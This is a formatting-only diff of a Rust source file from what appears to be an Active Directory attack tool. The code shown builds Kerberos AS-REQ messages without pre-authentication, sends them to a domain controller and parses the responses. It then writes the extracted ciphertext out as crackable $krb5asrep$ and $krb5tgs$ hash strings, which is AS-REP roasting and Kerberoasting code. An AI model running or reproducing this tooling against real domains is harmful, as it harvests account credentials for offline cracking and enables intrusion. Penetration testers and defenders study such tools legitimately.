@@ -16,12 +16,16 @@ impl RoastResult {
         let hex_check = hex_encode(&self.checksum);
         if let Some(ref spn) = self.spn {
             // $krb5tgs$etype$*user$realm$spn*$checksum$edata
-            format!("$krb5tgs${}$*{}${}${}*${}${}",
-                self.etype, self.username, self.domain, spn, hex_check, hex_data)
+            format!(
+                "$krb5tgs${}$*{}${}${}*${}${}",
+                self.etype, self.username, self.domain, spn, hex_check, hex_data
+            )
         } else {
             // $krb5asrep$etype$user@realm:checksum$edata
-            format!("$krb5asrep${}${}@{}:{}${}",
-                self.etype, self.username, self.domain, hex_check, hex_data)
+            format!(
+                "$krb5asrep${}${}@{}:{}${}",
+                self.etype, self.username, self.domain, hex_check, hex_data
+            )
         }
     }
 }
@@ -37,7 +41,9 @@ pub async fn asreproast_user(
     let as_req = build_asreproast_asreq(username, &realm, nonce);
     let response = crate::kerberos::send_kdc(dc, &as_req, false).await?;
 
-    if response.len() < 4 { return Ok(None); }
+    if response.len() < 4 {
+        return Ok(None);
+    }
 
     // Check if AS-REP (tag 0x6b = [APPLICATION 11])
     if response[0] == 0x6b || (response[0] == 0x7b) {
@@ -133,7 +139,7 @@ fn build_asreproast_asreq(username: &str, realm: &str, nonce: u32) -> Vec<u8> {
     let mut kdc_req = Vec::new();
     kdc_req.extend(encode_context_tag(1, &encode_integer(5))); // pvno
     kdc_req.extend(encode_context_tag(2, &encode_integer(10))); // msg-type AS-REQ
-    // No padata (no pre-auth)
+                                                                // No padata (no pre-auth)
     kdc_req.extend(encode_context_tag(4, &req_body));
 
     let seq = encode_sequence(&[&kdc_req]);
@@ -161,16 +167,20 @@ fn find_enc_part_cipher(data: &[u8], _app_tag: u8) -> Result<Vec<u8>, Box<dyn Er
     let mut last_octet_string = Vec::new();
 
     while pos < data.len() {
-        if pos + 2 > data.len() { break; }
+        if pos + 2 > data.len() {
+            break;
+        }
         let tag = data[pos];
         pos += 1;
 
         let len = parse_asn1_length(data, &mut pos)?;
-        if pos + len > data.len() { break; }
+        if pos + len > data.len() {
+            break;
+        }
 
         if tag == 0x04 || tag == 0x82 {
             // OCTET STRING
-            last_octet_string = data[pos..pos+len].to_vec();
+            last_octet_string = data[pos..pos + len].to_vec();
         }
 
         // Recurse into constructed types
@@ -185,13 +195,17 @@ fn find_enc_part_cipher(data: &[u8], _app_tag: u8) -> Result<Vec<u8>, Box<dyn Er
     if last_octet_string.is_empty() {
         // Fallback: find the largest continuous block of non-ASN1 data near the end
         // The cipher is typically the last large OCTET STRING
-        let search_start = if data.len() > 256 { data.len() - 256 } else { 0 };
+        let search_start = if data.len() > 256 {
+            data.len() - 256
+        } else {
+            0
+        };
         for i in (search_start..data.len()).rev() {
             if data[i] == 0x04 && i + 1 < data.len() {
                 let mut p = i + 1;
                 if let Ok(len) = parse_asn1_length(data, &mut p) {
                     if p + len <= data.len() && len > 16 {
-                        return Ok(data[p..p+len].to_vec());
+                        return Ok(data[p..p + len].to_vec());
                     }
                 }
             }
@@ -203,7 +217,9 @@ fn find_enc_part_cipher(data: &[u8], _app_tag: u8) -> Result<Vec<u8>, Box<dyn Er
 }
 
 fn parse_asn1_length(data: &[u8], pos: &mut usize) -> Result<usize, Box<dyn Error>> {
-    if *pos >= data.len() { return Err("unexpected end".into()); }
+    if *pos >= data.len() {
+        return Err("unexpected end".into());
+    }
     let first = data[*pos];
     *pos += 1;
 
